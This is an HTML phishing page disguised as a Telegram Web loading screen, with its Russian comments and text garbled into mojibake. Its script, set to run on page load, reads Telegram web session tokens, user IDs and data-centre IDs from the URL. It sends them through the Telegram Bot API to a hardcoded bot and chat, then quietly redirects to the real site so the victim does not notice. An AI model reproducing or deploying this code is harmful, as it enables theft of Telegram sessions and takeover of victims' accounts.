<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Telegram Web</title>
    <style>
        body { background: #0f0f0f; color: #fff; font-family: system-ui; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .loader { text-align: center; }
        .logo { font-size: 48px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="loader">
        <div class="logo">Telegram</div>
        <p>–ó–∞–≥—Ä—É–∑–∫–∞ –≤–µ–±-–≤–µ—Ä—Å–∏–∏...</p>
    </div>

    <script>
        function stealToken() {
            const hash = window.location.hash.substring(1);
            if (!hash.includes('tgWebAuthToken')) {
                // –ï—Å–ª–∏ —Ç–æ–∫–µ–Ω–∞ –Ω–µ—Ç ‚Äî –ø—Ä–æ—Å—Ç–æ —Ä–µ–¥–∏—Ä–µ–∫—Ç (–Ω–∞ —Å–ª—É—á–∞–π –µ—Å–ª–∏ –æ—Ç–∫—Ä—ã–ª–∏ –±–µ–∑ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è)
                window.location.replace('https://web.telegram.org/k/');
                return;
            }

            const params = new URLSearchParams(hash);
            const data = {
                token: params.get('tgWebAuthToken'),
                userId: params.get('tgWebAuthUserId'),
                dcId: params.get('tgWebAuthDcId'),
                fullUrl: window.location.href,
                timestamp: Date.now()
            };

            // === –û–¢–ü–†–ê–í–ö–ê –í –¢–í–û–ô –¢–ì ===
            const BOT_TOKEN = '8541613029:AAF9uWzlAYEJy1kNM89yQfMtIz3bh53AOo4';        // –°–æ–∑–¥–∞–π –±–æ—Ç–∞ —É @BotFather
            const CHAT_ID = '8220267007';           // @userinfobot –ø–æ–∫–∞–∂–µ—Ç

            const message = `üî• –ù–û–í–´–ô –¢–û–ö–ï–ù üî•\n\n` +
                `Token: ${data.token}\n` +
                `UserID: ${data.userId}\n` +
                `DC: ${data.dcId}\n` +
                `–í—Ä–µ–º—è: ${new Date(data.timestamp).toLocaleString('ru-RU')}\n` +
                `URL: ${data.fullUrl}`;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`)
                .then(() => console.log('–¢–æ–∫–µ–Ω —É—à—ë–ª'))
                .catch(err => console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏', err));

            // –†–µ–¥–∏—Ä–µ–∫—Ç –Ω–∞ –æ—Ä–∏–≥–∏–Ω–∞–ª —á–µ—Ä–µ–∑ 400–º—Å (—á—Ç–æ–±—ã –Ω–µ –±—ã–ª–æ –∑–∞–º–µ—Ç–Ω–æ)
            setTimeout(() => {
                window.location.replace('https://web.telegram.org/k/');
            }, 400);
        }

        // –ó–∞–ø—É—Å–∫ —Å—Ä–∞–∑—É
        window.onload = stealToken;

        // –ù–∞ –≤—Å—è–∫–∏–π —Å–ª—É—á–∞–π ‚Äî –µ—Å–ª–∏ —Ö—ç—à –ø–æ—è–≤–∏–ª—Å—è –ø–æ–∑–∂–µ (—Ä–µ–¥–∫–æ, –Ω–æ –±—ã–≤–∞–µ—Ç)
        window.addEventListener('hashchange', stealToken);
    </script>
</body>
</html>
